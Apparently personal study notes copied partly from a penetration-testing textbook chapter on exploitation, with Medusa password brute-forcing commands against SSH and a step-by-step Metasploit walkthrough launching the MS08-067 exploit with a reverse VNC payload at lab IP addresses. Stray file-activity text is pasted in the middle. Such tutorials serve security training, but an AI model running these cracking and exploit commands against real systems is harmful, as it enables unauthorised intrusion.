- Exploitation

In the simplest terms, exploitation is the process of gaining control over a
system. However, it is important to understand that not every exploit leads to
total system compromise. For example, the Oracle padding exploit can reveal
information and allow us to download files but does not fully compromise
the system. More accurately defined, an exploit is a way to bypass a security flaw
or circumvent security controls. This process can take many different forms but
for the purpose of this book, the end goal always remains the same:
administrative-level access to the computer. In many ways, exploitation is an
attempt to turn the target machine into a puppet that will execute your com-
mands and do your bidding. Just to be clear, exploitation is the process of
launching an exploit. An exploit is the realization, actualization, or weaponiza-
tion of vulnerability. Exploits are issues or bugs in the software code that give
a hacker or attacker the ability to launch or execute a payload against the target
system. A payload is a way to turn the target machine into a puppet and force it to
do our will. Payloads can alter the original functionality of the software and allow
us to do any number of things like install new software, disable running services,
add new users, open backdoors to the compromised system, and much more.


- Medusa: Gaining access to remote services
Another software to hack a password would be Hydra

Kali linux has password dictionary data located at
/usr/share/wordlists


What I need is
target IP
some remote authentication service
password dict
username list

I can use Medusa for cracking a password.
The command will be


medusa -h <target_ip> -u <username> -P <path_to_password_dict> -M <authentication_service_to_attack>

or If I have a list of users
medusa -h <target_ip> -U <username_list> -P <path_to_password_dict> -M <authentication_service_to_attack>



Expected attack plan:
example.com is the host that I'll be attacking.
In the information gathering process, I found the username 'yahoo_hi' and ip address of 192.168.18.132 to use MetaGoofil.
In the sccanning process, I found the server is running SSH on port 22.

Based on these information, I can do password crack to type these exmple command

# medusa -h 192.168.18.132 -u yahoo_hi -P /usr/share/john/password.lst -M ssh



-Metasploit
Boosting up the Metasploit
# msfconsole


Nessus report or “Nmap --script vuln” output.
Assume that during your penetration test you uncovered a new target at the IP

address 192.168.18.131. Running Nmap tells you that your new target is

a Windows XP machine with service pack 3 installed and the firewall disabled.

Continuing with step 2, you run both the NSE --script vuln scan and Nessus

against the target. Figure 4.3 shows the completed Nessus report for

192.168.18.131. Notice there are two “critical” findings.


search ms08-067

use exploit/windows/smb/ms08_067_netapi
show payloads
set payload windows/vncinject/reverse_tcp


exploitation.txt
DETAILS
ACTIVITY
Today
K
You uploaded an item
5:22 PM
Text
exploitation.txt
No recorded activity before June 10, 2017

show options

After issuing the show options command, we are presented with a series of

choices that are specific to the payload we have chosen. When using the

“windows/vncinject/reverse_tcp” payload, we see that there are two options that

need to be set because they are missing any default information. The first is

“RHOST” and the second is “LHOST”. RHOST is the IP address of the target

(remote) host and LHOST (local host) is the IP address you are attacking from. To

set these options, we issue the “set option_name” command in the msf> terminal:

set RHOST 192.168.18.131

set LHOST 192.168.18.130

Now that you have required options set, it is usually a good idea at this point to

reissue the “show options” command to ensure you are not missing any

information.

show options

Once you are sure that you have entered all the information correctly, you are

ready to launch your exploit. To send your exploit to the target machine, simply

type the keyword “exploit” into the “msf>” terminal and hit the Enter key to

begin the process.

exploit

Figure 4.5 shows the minimum command set (minus the “show payloads” and

“show options” command) required to launch the exploit.


Cheat Sheet


1. Start Metasploit by opening a terminal and issue the following command:

a. msf> msfconsole

2. Issue the “search” command to search for exploits that match your vulner-
ability scanning report:

a. msf> search missing_patch_number (or CVE)

3. Issue the “use” command to select the desired exploit:

a. msf> use exploit_name_and_path_as_shown_in_2a

4. Issue “show payloads” command to show available payloads:

a. msf> show payloads

5. Issue “set” command to select payload:

a. msf> set payload path_to_payload_as_shown_in_4a

6. Issue “show options” to view any options needing to be filled out before

exploiting the target:

a. msf> show options

FIGURE 4.5

The commands required to launch an exploit from metasploit.

Exploitation CHAPTER 4 93

7. Issue the “set” command for any options listed in 6a:

a. msf> set option_name desired_option_input

8. Issue “exploit” command to launch exploit against target:

a. msf> “exploit”

ALERT!

The VNC payload requires the target OS to be running a GUI-based OS like Microsoft

Windows. If your target is not running a GUI, there are lots of other payloads,





- JTR: King of the password crackers
